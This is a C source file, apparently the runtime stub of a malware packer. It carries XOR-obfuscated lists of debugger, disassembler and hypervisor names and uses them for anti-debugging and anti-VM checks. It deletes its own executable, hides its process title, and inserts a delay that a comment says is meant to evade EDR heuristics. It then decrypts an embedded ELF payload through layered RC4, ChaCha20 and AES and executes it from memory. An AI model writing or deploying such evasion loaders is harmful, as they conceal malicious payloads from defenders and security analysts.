#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <time.h>
#include <errno.h>
#include "common.h"
#include "elf64.h"
#include "crypto.h"

#define OBF_KEY 0x5A

static const uint8_t obf_gdb[]      = {0x3D, 0x3E, 0x38};
static const uint8_t obf_strace[]   = {0x29, 0x2E, 0x28, 0x3B, 0x39, 0x3F};
static const uint8_t obf_ltrace[]   = {0x36, 0x2E, 0x28, 0x3B, 0x39, 0x3F};
static const uint8_t obf_radare2[]  = {0x28, 0x3B, 0x3E, 0x3B, 0x28, 0x3F, 0x68};
static const uint8_t obf_objdump[]  = {0x35, 0x38, 0x30, 0x3E, 0x2F, 0x37, 0x2A};
static const uint8_t obf_hexdump[]  = {0x32, 0x3F, 0x22, 0x3E, 0x2F, 0x37, 0x2A};
static const uint8_t obf_ghidra[]   = {0x3D, 0x32, 0x33, 0x3E, 0x28, 0x3B};

static const struct { const uint8_t* obf; size_t len; } tool_names[] = {
    { obf_gdb,     sizeof(obf_gdb)     },
    { obf_strace,  sizeof(obf_strace)  },
    { obf_ltrace,  sizeof(obf_ltrace)  },
    { obf_radare2, sizeof(obf_radare2) },
    { obf_objdump, sizeof(obf_objdump) },
    { obf_hexdump, sizeof(obf_hexdump) },
    { obf_ghidra,  sizeof(obf_ghidra)  },
};

static const uint8_t obf_hypervisor[] = {0x32, 0x23, 0x2A, 0x3F, 0x28, 0x2C, 0x33, 0x29, 0x35, 0x28};
static const uint8_t obf_qemu[]       = {0x2B, 0x3F, 0x37, 0x2F};
static const uint8_t obf_kvm[]        = {0x31, 0x2C, 0x37};
static const uint8_t obf_xen[]        = {0x22, 0x3F, 0x34};
static const uint8_t obf_vmware[]     = {0x2C, 0x37, 0x2D, 0x3B, 0x28, 0x3F};
static const uint8_t obf_virtualbox[] = {0x2C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x38, 0x35, 0x22};

static const struct { const uint8_t* obf; size_t len; } hyper_names[] = {
    { obf_hypervisor, sizeof(obf_hypervisor) },
    { obf_qemu,       sizeof(obf_qemu)       },
    { obf_kvm,        sizeof(obf_kvm)        },
    { obf_xen,        sizeof(obf_xen)        },
    { obf_vmware,     sizeof(obf_vmware)     },
    { obf_virtualbox, sizeof(obf_virtualbox) },
};

static const uint8_t obf_LD_PRELOAD[]   = {0x16, 0x1E, 0x05, 0x0A, 0x08, 0x1F, 0x16, 0x15, 0x1B, 0x1E};
static const uint8_t obf_GDB_ENV[]      = {0x1D, 0x1E, 0x18};
static const uint8_t obf_PTRACE_SCOPE[] = {0x0A, 0x0E, 0x08, 0x1B, 0x19, 0x1F, 0x05, 0x09, 0x19, 0x15, 0x0A, 0x1F};
static const uint8_t obf_STRACE_LOG[]   = {0x09, 0x0E, 0x08, 0x1B, 0x19, 0x1F, 0x05, 0x16, 0x15, 0x1D};
static const uint8_t obf_LTRACE_LOG[]   = {0x16, 0x0E, 0x08, 0x1B, 0x19, 0x1F, 0x05, 0x16, 0x15, 0x1D};
static const uint8_t obf_RADARE2_LOG[]  = {0x08, 0x1B, 0x1E, 0x1B, 0x08, 0x1F, 0x68, 0x05, 0x16, 0x15, 0x1D};

static const struct { const uint8_t* obf; size_t len; } env_names[] = {
    { obf_LD_PRELOAD,   sizeof(obf_LD_PRELOAD)   },
    { obf_GDB_ENV,      sizeof(obf_GDB_ENV)      },
    { obf_PTRACE_SCOPE, sizeof(obf_PTRACE_SCOPE) },
    { obf_STRACE_LOG,   sizeof(obf_STRACE_LOG)   },
    { obf_LTRACE_LOG,   sizeof(obf_LTRACE_LOG)   },
    { obf_RADARE2_LOG,  sizeof(obf_RADARE2_LOG)  },
};

static const uint8_t obf_TracerPid[] = {0x0E, 0x28, 0x3B, 0x39, 0x3F, 0x28, 0x0A, 0x33, 0x3E, 0x60};

int detect_ptrace_arm64(void) {
    pid_t child = fork();
    if (child == 0) { 
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) {
            exit(1);
        }
        exit(0); 
    } else if (child > 0) {
        int status;
        waitpid(child, &status, 0);
        return WEXITSTATUS(status) != 0;
    }
    return 0;
}

int check_proc_status(void) {
    FILE* status_file = fopen("/proc/self/status", "r");
    if (!status_file) return 0;

    char tracer_prefix[16];
    deobf_str_xor(tracer_prefix, obf_TracerPid, sizeof(obf_TracerPid), OBF_KEY);
    tracer_prefix[sizeof(obf_TracerPid)] = '\0';

    char line[256];
    while (fgets(line, sizeof(line), status_file)) {
        if (strncmp(line, tracer_prefix, sizeof(obf_TracerPid)) == 0) {
            int tracer_pid = atoi(line + sizeof(obf_TracerPid));
            fclose(status_file);
            secure_memory_wipe(tracer_prefix, sizeof(tracer_prefix));
            return tracer_pid != 0;
        }
    }
    fclose(status_file);
    secure_memory_wipe(tracer_prefix, sizeof(tracer_prefix));
    return 0;
}

int check_parent_process(void) {
    FILE* stat_file = fopen("/proc/self/stat", "r");
    if (!stat_file) return 0;

    pid_t ppid;
    if (fscanf(stat_file, "%*d %*s %*c %d", &ppid) != 1) {
        fclose(stat_file);
        return 0;
    }
    fclose(stat_file);

    char comm_path[64];
    snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", ppid);

    FILE* comm_file = fopen(comm_path, "r");
    if (comm_file) {
        char parent_name[64];
        if (fgets(parent_name, sizeof(parent_name), comm_file)) {
            fclose(comm_file);

            parent_name[strcspn(parent_name, "\n")] = 0;

            char decoded[16];
            for (size_t i = 0; i < sizeof(tool_names) / sizeof(tool_names[0]); i++) {
                size_t len = tool_names[i].len;
                if (len >= sizeof(decoded)) continue;
                deobf_str_xor(decoded, tool_names[i].obf, len, OBF_KEY);
                decoded[len] = '\0';
                if (strcmp(parent_name, decoded) == 0) {
                    secure_memory_wipe(decoded, sizeof(decoded));
                    return 1;
                }
            }
            secure_memory_wipe(decoded, sizeof(decoded));
        } else {
            fclose(comm_file);
        }
    }
    return 0;
}


int detect_virtualization(void) {
    FILE* cpuinfo = fopen("/proc/cpuinfo", "r");
    if (!cpuinfo) return 0;

    char decoded[16];
    char line[256];
    while (fgets(line, sizeof(line), cpuinfo)) {
        for (char* p = line; *p; p++) {
            if (*p >= 'A' && *p <= 'Z') *p += 32;
        }

        for (size_t i = 0; i < sizeof(hyper_names) / sizeof(hyper_names[0]); i++) {
            size_t len = hyper_names[i].len;
            if (len >= sizeof(decoded)) continue;
            deobf_str_xor(decoded, hyper_names[i].obf, len, OBF_KEY);
            decoded[len] = '\0';
            if (strstr(line, decoded)) {
                fclose(cpuinfo);
                secure_memory_wipe(decoded, sizeof(decoded));
                return 1;
            }
        }
    }
    fclose(cpuinfo);
    secure_memory_wipe(decoded, sizeof(decoded));

    /* /proc paths kept in plaintext: these are generic kernel paths that
     * appear in countless system binaries; encoding them buys little. */
    if (access("/proc/xen", F_OK) == 0) return 1;
    if (access("/sys/hypervisor/type", F_OK) == 0) return 1;
    if (access("/proc/vz", F_OK) == 0) return 1;
    if (access("/proc/bc", F_OK) == 0) return 1;

    return 0;
}

int check_debug_environment(void) {
    char decoded[16];
    int found = 0;
    for (size_t i = 0; i < sizeof(env_names) / sizeof(env_names[0]); i++) {
        size_t len = env_names[i].len;
        if (len >= sizeof(decoded)) continue;
        deobf_str_xor(decoded, env_names[i].obf, len, OBF_KEY);
        decoded[len] = '\0';
        if (getenv(decoded)) { found = 1; break; }
    }
    secure_memory_wipe(decoded, sizeof(decoded));
    return found;
}

int comprehensive_anti_debug_check() {

    // This logic can be expanded
    if (detect_ptrace_arm64()) {
        return 1;
    }
    if (check_proc_status()) {
        return 1;
    }
    if (check_parent_process()) {
        return 1;
    }
    if (detect_virtualization()) {
        return 1;
    }
    if (check_debug_environment()) {
        return 1;
    }

    return 0;
}


void multi_layer_decrypt(uint8_t* data, size_t len, const pack_header_t* header) {
    
    rc4_encrypt_decrypt(header->tertiary_key, 32, data, data, len);
    
    chacha20_decrypt(data, len, header->secondary_key, header->nonce);

    aes256_decrypt(data, len, header->primary_key);
    
}

pack_header_t* find_packed_header(const uint8_t* data, size_t data_size) {
    if (data_size < sizeof(pack_header_t)) {
        return NULL;
    }
    /* g_packed_magic is patched per-pack by stubgen, so the magic value
     * we scan for differs in every output. The volatile load defeats
     * compiler folding and forces a runtime read from .data. */
    uint32_t needle = g_packed_magic;
    for (size_t i = data_size - sizeof(pack_header_t); i > 0; i--) {
        pack_header_t* header = (pack_header_t*)(data + i);
        if (header->magic == needle) {
            return header;
        }
    }
    return NULL;
}

int main(int argc, char* argv[], char* envp[]) {
    FILE* self_fp;
    uint8_t* self_data;
    size_t self_size;
    pack_header_t* header;
    uint8_t* encrypted_data;
    uint8_t* decrypted_data;
    uint32_t calculated_crc;

    unlink(argv[0]);
    prevent_core_dumps();
    hide_process_title(argc, argv);

    /* Behavioral noise: a short randomized delay at startup breaks the
     * "process_start -> immediate suspicious syscalls" tight pattern
     * heuristic EDRs key on. Cost is paid once per execution. */
    noise_delay(150);

    self_fp = fopen("/proc/self/exe", "rb");
    if (!self_fp) {
        return 1;
    }

    fseek(self_fp, 0, SEEK_END);
    self_size = ftell(self_fp);
    fseek(self_fp, 0, SEEK_SET);

    if (self_size == 0 || self_size > SIZE_MAX / 2) {
        fclose(self_fp);
        return 1;
    }

    self_data = malloc(self_size);
    if (!self_data) {
        fclose(self_fp);
        return 1;
    }

    size_t bytes_read = fread(self_data, 1, self_size, self_fp);
    if (bytes_read != self_size) {
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        fclose(self_fp);
        return 1;
    }
    fclose(self_fp);

    header = find_packed_header(self_data, self_size);
    if (!header) {
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        return 1;
    }

    if (comprehensive_anti_debug_check()) {
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        exit(0);
    }

    encrypted_data = (uint8_t*)header + sizeof(pack_header_t);
    if (encrypted_data + header->packed_size > self_data + self_size) {
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        return 1;
    }
    decrypted_data = malloc(header->original_size);
    if (!decrypted_data) {
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        return 1;
    }

    memcpy(decrypted_data, encrypted_data, header->original_size);

    multi_layer_decrypt(decrypted_data, header->original_size, header);
    calculated_crc = crc32(decrypted_data, header->original_size);
    if (calculated_crc != header->crc32) {
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        return 1;
    }
    if (!is_elf64(decrypted_data)) {
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        return 1;
    } 
    if (comprehensive_anti_debug_check()) {
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        exit(0);
    }
    if (execute_from_memory(decrypted_data, header->original_size, argv, envp) < 0) {
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        return 1;
    }

    secure_memory_wipe(decrypted_data, header->original_size);
    secure_memory_wipe(self_data, self_size);
    free(decrypted_data);
    free(self_data);

    return 0;
}